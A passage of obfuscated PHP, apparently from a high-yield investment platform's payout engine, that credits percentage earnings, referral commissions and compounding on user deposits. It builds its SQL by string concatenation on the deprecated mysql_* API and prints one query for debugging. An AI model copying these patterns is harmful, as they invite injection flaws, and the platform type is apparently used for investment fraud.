                      $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcTnMjL[$elnlcEuoJk['elnlcvbav']];
                    }
                  }
                }
                else
                {
                  $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcEuoJk['elnlcTMAG'];
                }

                if ((0 < $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] <= 100))
                {
                  $elnlcQRWek = $elnlcCEUNG * $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] / 100;
                  $elnlcCEUNG = floor ((floor ($elnlcCEUNG * 100000) / 100000 - floor ($elnlcQRWek * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ('' . ',
                        amount = -' . $elnlcQRWek . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcQRWek . ',
                    		ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    		date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                                deposit_id = ') . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcQRWek . ',
                    		actual_amount = actual_amount + ' . $elnlcQRWek . '
                    		where id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlccbtp ($elnlcTnMjL[$elnlcEuoJk['elnlciwGl']], $elnlcCEUNG, 'date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlchRExl . ' ' . $elnlcznNn . ' where id =' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlcbaLW = mysql_query ($q);
      while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
      {
        if ($elnlcTnMjL[$elnlcEuoJk['elnlcWhGEq']] == 1)
        {
          $elnlcGANTz = floor ($elnlcTnMjL[$elnlcEuoJk['elnlcwNFK']] / 5) * 7 + $elnlcTnMjL[$elnlcEuoJk['elnlcwNFK']] % 5;
          $elnlctuWo = $elnlcTnMjL[$elnlcEuoJk['elnlceDTDA']] - (0 < $elnlcTnMjL[$elnlcEuoJk['elnlceDTDA']] ? 1 : 0);
          $elnlcWivT = '' . ' (' . $elnlcGANTz . ' + ((' . $elnlcTnMjL[$elnlcEuoJk['elnlcwNFK']] . ' % 5 + WEEKDAY(deposit_date)) > 5)*2 + ' . $elnlctuWo . ') ';
        }
        else
        {
          $elnlcGANTz = $elnlcTnMjL[$elnlcEuoJk['elnlcwNFK']] + $elnlcTnMjL[$elnlcEuoJk['elnlceDTDA']] - (0 < $elnlcTnMjL[$elnlcEuoJk['elnlceDTDA']] ? 1 : 0);
          $elnlcWivT = '' . ' ' . $elnlcGANTz . ' ';
        }

        $elnlcqaibS = $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
        if ($elnlcTnMjL[$elnlcEuoJk['elnlcMhIea']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlcqaibS . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcwlzeP . ' and 
                (
                   deposit_date + interval ' . $elnlcWivT . ' ' . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                      or
                   deposit_date + interval ' . $elnlcWivT . ' ') . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ('' . ' < now()
                )
                and
                (
                   (' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' = 0) || (' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' && (deposit_date + interval ' . $elnlcTnMjL[$elnlcEuoJk['elnlchKil']] . ' ') . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlcpHCU = mysql_query ($q);
          while ($elnlcVOMs = mysql_fetch_array ($elnlcpHCU))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlcVOMs[$elnlcEuoJk['elnlccuNQr']] . ',
      		amount = ' . $elnlcVOMs[$elnlcEuoJk['elnlcGJRR']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcVOMs[$elnlcEuoJk['elnlcGJRR']] . ',
                ec = ' . $elnlcVOMs[$elnlcEuoJk['elnlcFtnn']] . ',
      		date = \'' . $elnlcVOMs[$elnlcEuoJk['elnlcAQgnt']] . ('' . '\' + interval ' . $elnlcGANTz . ' ') . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlcVOMs[$elnlcEuoJk['elnlciwGl']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcwlzeP . ' and 
    	       (deposit_date + interval ' . $elnlcWivT . ' ' . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                  or
                deposit_date + interval ' . $elnlcWivT . ' ') . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ('' . ' < now()) and
               ((' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' = 0) || (' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' && (deposit_date + interval ' . $elnlcTnMjL[$elnlcEuoJk['elnlchKil']] . ' ') . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlcqaibS . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlcoloe ($elnlcQjzjO)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    $elnlcVqFdz = array ();
    if (($elnlcJutIa[$elnlcEuoJk['elnlcoNrc']] == 1 AND $elnlcQjzjO != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
    while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
    {
      $elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlcpzHPR']]][$elnlcTnMjL[$elnlcEuoJk['elnlciwGl']]] = $elnlcTnMjL;
    }

    $elnlcDrDrs = $elnlcEuoJk['elnlcRMbnT'];
    $elnlcNzxN = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcziJV'])
    {
      $elnlcCWWQ = 't.send_profit_to_stocks,t.send_percent_to_stocks';
      $elnlcTMrtF = ' t.pay_by_button = 0 and';
    }

    if ($elnlcQjzjO == -1)
    {
      $elnlcNzxN = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcQjzjO . ' and status = \'on\'';
    }

    if ($elnlcQjzjO == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcctGwF = mysql_query ($q) OR print mysql_error ());
    while ($elnlcxSCRb = mysql_fetch_array ($elnlcctGwF))
    {
      $elnlcwlzeP = $elnlcxSCRb[$elnlcEuoJk['elnlciwGl']];
      $elnlcDHasI = fopen ('' . './tmpl_c/lock_user' . $elnlcwlzeP, 'w+');
      if (flock ($elnlcDHasI, LOCK_EX))
      {
      }
      else
      {
        fclose ($elnlcDHasI);
        continue;
      }

      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcwlzeP;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcDrDrs = $elnlcEuoJk['elnlcRMbnT'];
      $q = 'select max(p.min_deposit) as min_deposit, p.parent as type_id from hm2_plans as p group by p.parent';
      ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
      while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
      {
        $q = '' . 'select max_deposit as max_amount from hm2_plans where parent = ' . $elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']] . ' and min_deposit = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcQFob']];
        ($elnlciPGsk = mysql_query ($q) OR print mysql_error ());
        while ($elnlcGukIR = mysql_fetch_array ($elnlciPGsk))
        {
          $elnlcnukTq[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]] = $elnlcGukIR[$elnlcEuoJk['elnlcIwSM']];
        }
      }

      while (0 < $elnlcDrDrs)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
/*              t.rpcp as rpcp,*/
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              t.delay as delay,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              ' . $elnlcCWWQ . '
              t.return_profit as return_profit,
              t.return_profit_percent as return_profit_percent
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcwlzeP . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              ' . $elnlcTMrtF . '
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
        $elnlcDrDrs = $elnlcEuoJk['elnlcTMAG'];
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          ++$elnlcDrDrs;
          if (!isset ($elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]]))
          {
            continue;
          }

          $elnlcGGxPb = $elnlcEuoJk['elnlcTMAG'];
          $elnlcUIzCR = $elnlcEuoJk['elnlcTMAG'];
          reset ($elnlcVqFdz);
          reset ($elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]]);
          while (list ($elnlcjgHVx, $elnlcNdIze) = each ($elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]]))
          {
            if (($elnlcNdIze[$elnlcEuoJk['elnlcQFob']] <= $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] AND ($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] <= $elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] OR $elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] == 0)))
            {
              $elnlcGGxPb = $elnlcNdIze[$elnlcEuoJk['elnlcicuKE']];
            }

            if (($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] < $elnlcNdIze[$elnlcEuoJk['elnlcQFob']] AND $elnlcGGxPb == 0))
            {
              $elnlcGGxPb = $elnlcUIzCR;
            }

            if (($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] < $elnlcNdIze[$elnlcEuoJk['elnlcQFob']] AND 0 < $elnlcGGxPb))
            {
              break;
            }

            $elnlcUIzCR = $elnlcNdIze[$elnlcEuoJk['elnlcicuKE']];
          }

          if (($elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] != 0 AND $elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] < $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']]))
          {
            $elnlcGGxPb = $elnlcUIzCR;
          }

          $elnlcCEUNG = $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] * $elnlcGGxPb / 100;
          $elnlchRExl = '';
          if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlczBIx'])
          {
            $elnlchRExl = ' 1 day ';
          }
          else
          {
            if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'])
            {
              $elnlchRExl = ' 1 hour ';
            }
            else
            {
              if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcQWmx'])
              {
                $elnlchRExl = ' 7 day ';
              }
              else
              {
                if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == 'b-w')
                {
                  $elnlchRExl = ' 14 day ';
                }
                else
                {
                  if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlctKdcx'])
                  {
                    $elnlchRExl = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcWsvHa'])
                    {
                      $elnlchRExl = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcUEQok'])
                      {
                        $elnlchRExl = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcQTmA'])
                        {
                          $elnlchRExl = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcgGyV'])
                          {
                            $elnlchRExl = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlckgRG'])
                            {
                              $elnlchRExl = ' ' . $elnlcTnMjL[$elnlcEuoJk['elnlcwNFK']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcGGxPb == 0 AND $elnlchRExl == ''))
          {
            continue;
          }

          $elnlcWsTb = -1;
          $q = 'select weekday(\'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ') as dw');
          ($elnlciPGsk = mysql_query ($q) OR print mysql_error ());
          while ($elnlcGukIR = mysql_fetch_array ($elnlciPGsk))
          {
            $elnlcWsTb = $elnlcGukIR[$elnlcEuoJk['elnlcmhGF']];
          }

          $q = 'select count(id) as `col` from hm2_history where 
		type = \'earning\' and ' . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ') and ')) . ' deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
          ($elnlcvAkrE = mysql_query ($q) OR print mysql_error ());
          $elnlcLDnww = $elnlcEuoJk['elnlcTMAG'];
          while ($elnlceHtV = mysql_fetch_array ($elnlcvAkrE))
          {
            $elnlcLDnww = $elnlceHtV[$elnlcEuoJk['elnlcbiVt']];
          }

          if ($elnlcLDnww == 0)
          {
            if ((5 <= $elnlcWsTb AND $elnlcTnMjL[$elnlcEuoJk['elnlcWhGEq']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcWsTb == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                    ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
              (mysql_query ($q) OR print mysql_error ());
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ('' . ',
                    amount = ' . $elnlcCEUNG . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcJutIa[$elnlcEuoJk['elnlcoaQSz']] . number_format ($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']], 2) . ('' . ' - ' . $elnlcGGxPb . ' %\',
                    actual_amount = ' . $elnlcCEUNG . ',
                    date = \'') . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                    ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlchPboH'])
              {
                if ((0 < $elnlcxSCRb[$elnlcEuoJk['elnlcJzIQ']] AND 0 < $elnlcJutIa[$elnlcEuoJk['elnlcoBmV']]))
                {
                  $elnlctvme = $elnlcCEUNG * $elnlcJutIa[$elnlcEuoJk['elnlcoBmV']] / 100;
                  $elnlchuOSt = elnlcmzdkr ($elnlcxSCRb[$elnlcEuoJk['elnlcxDSIx']]);
                  if ($elnlcJutIa[$elnlcEuoJk['elnlcPDiIw']] <= $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']])
                  {
                    $q = '' . 'select max(actual_amount) as maxam from hm2_deposits where user_id = ' . $elnlcxSCRb[$elnlcEuoJk['elnlcJzIQ']] . ' and status = \'on\'';
                    ($elnlciPGsk = mysql_query ($q) OR print mysql_error ());
                    $elnlceHAK = $elnlcEuoJk['elnlcTMAG'];
                    while ($elnlcGukIR = mysql_fetch_array ($elnlciPGsk))
                    {
                      $elnlceHAK = $elnlcGukIR[$elnlcEuoJk['elnlcBdjSp']];
                    }

                    if ($elnlcJutIa[$elnlcEuoJk['elnlcaOUw']] <= $elnlceHAK)
                    {
                      $q = '' . 'insert into hm2_history set user_id = ' . $elnlcxSCRb[$elnlcEuoJk['elnlcJzIQ']] . ',
			amount = ' . $elnlctvme . ',
			type = \'commissions\',
			description = \'Daily referral earning from user ' . $elnlchuOSt . '\',
			actual_amount = ' . $elnlctvme . ',
			date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                        ec = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
			str = \'gg\'');
                      (mysql_query ($q) OR print mysql_error ());
                    }
                  }
                }
              }

              if (($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcziJV'] AND $elnlcTnMjL[$elnlcEuoJk['elnlchcMw']]))
              {
                $elnlcMcdm = floor ($elnlcCEUNG * $elnlcTnMjL[$elnlcEuoJk['elnlcwTHAT']]) / 100;
                if (0 < $elnlcMcdm)
                {
                  $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ('' . ',
                      amount = -' . $elnlcMcdm . ',
                      type = \'penality\',
                      description = \'Earning moved to Stocks account\',
                      actual_amount = -' . $elnlcMcdm . ',
                      date = \'') . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                      ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                      str = \'gg\',
                      deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = 'insert into sh2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ('' . ',
                      amount = ' . $elnlcMcdm . ',
                      type = \'bonus\',
                      description = \'Earning received to buy shares\',
                      actual_amount = ' . $elnlcMcdm . ',
                      date = \'') . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                      ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                      str = \'gg\'';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }

          $elnlcznNn = '';
          if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlckgRG'])
          {
            if (($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] == 0 OR ($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcgJuc']])))
            {
              $elnlcznNn = ', status = \'off\'';
            }

            if (($elnlcTnMjL[$elnlcEuoJk['elnlcMhIea']] == 1 AND ($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] == 0 OR ($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcgJuc']]))))
            {
              $elnlcwIHT = $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']];
              $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ',
                    amount = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcwIHT . ',
                    ec = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ('' . ',
                    date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . '\' + interval ' . $elnlchRExl . ',
                    deposit_id = ') . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']] . ',
                    description = \'Deposit release\'';
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcggiN'])
              {
                if (0 < $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']])
                {
                  $q = '' . 'select sum(actual_amount) as amt from hm2_history where deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']] . ' and type = \'earning\' and user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']];
                  print $q;
                  ($elnlcEUab = mysql_query ($q) OR print mysql_error ());
                  $elnlcbnKLI = $elnlcEuoJk['elnlcTMAG'];
                  while ($elnlcTsoA = mysql_fetch_array ($elnlcEUab))
                  {
                    $elnlcbnKLI = $elnlcTsoA[$elnlcEuoJk['elnlcVqds']];
                  }

                  $elnlcDAGR = ($elnlcwIHT + $elnlcbnKLI) * $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] / 100;
                  $elnlctuWo = intval ($elnlcTnMjL[$elnlcEuoJk['elnlceDTDA']]);
                  $q = '' . 'insert into hm2_deposits set 
		           user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ',
		           type_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']] . ',
		           deposit_date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . '\' + interval ' . $elnlchRExl . ',
		           last_pay_date = (\'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . '\' + interval ' . $elnlchRExl . ') + interval ' . $elnlctuWo . ' day,
		           status = \'on\',
		           amount = ' . $elnlcDAGR . ',
		           actual_amount = ' . $elnlcDAGR . ',
		           compound = 0,
		           ec = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                  $elnlcEmcUR = mysql_insert_id ();
                  $q = '' . 'insert into hm2_history set 
		           user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ',
		           amount = -' . $elnlcDAGR . ',
		           actual_amount = -' . $elnlcDAGR . ',
		           type=\'deposit\',
		           date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . '\' + interval ' . $elnlchRExl . ',
		           description = \'Deposit (reinvest)\',
		           ec = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
		           deposit_id = ' . $elnlcEmcUR . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }
          else
          {
            if ((5 <= $elnlcWsTb AND $elnlcTnMjL[$elnlcEuoJk['elnlcWhGEq']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] <= 100) AND $elnlcTnMjL[$elnlcEuoJk['elnlcgRBBC']] == 1))
              {
                if ($elnlcTnMjL[$elnlcEuoJk['elnlcuafl']] == 0)
                {
                  $elnlcTnMjL[$elnlcEuoJk['elnlcuafl']] = $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] + 1;
                }

                if (($elnlcTnMjL[$elnlcEuoJk['elnlcaWrN']] <= $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] <= $elnlcTnMjL[$elnlcEuoJk['elnlcuafl']]))
                {
                  if ($elnlcTnMjL[$elnlcEuoJk['elnlcVJgiM']] == 1)
                  {
                    $elnlcSJCUR = preg_split ('/\\s*,\\s*/', $elnlcTnMjL[$elnlcEuoJk['elnlcVAqsQ']]);
                    if (!in_array ($elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']], $elnlcSJCUR))
                    {
                      $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcSJCUR[0];
                    }
                  }
                  else
                  {
                    if ($elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] < $elnlcTnMjL[$elnlcEuoJk['elnlcJoei']])
                    {
                      $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcTnMjL[$elnlcEuoJk['elnlcJoei']];
                    }

                    if ($elnlcTnMjL[$elnlcEuoJk['elnlcvbav']] < $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']])
                    {
                      $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcTnMjL[$elnlcEuoJk['elnlcvbav']];
                    }
                  }
                }
                else
                {
                  $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcEuoJk['elnlcTMAG'];
                }

                if ((0 < $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] <= 100))
                {
                  $elnlcQRWek = $elnlcCEUNG * $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] / 100;
                  $elnlcCEUNG = floor ((floor ($elnlcCEUNG * 100000) / 100000 - floor ($elnlcQRWek * 100000) / 100000) * 100) / 100;
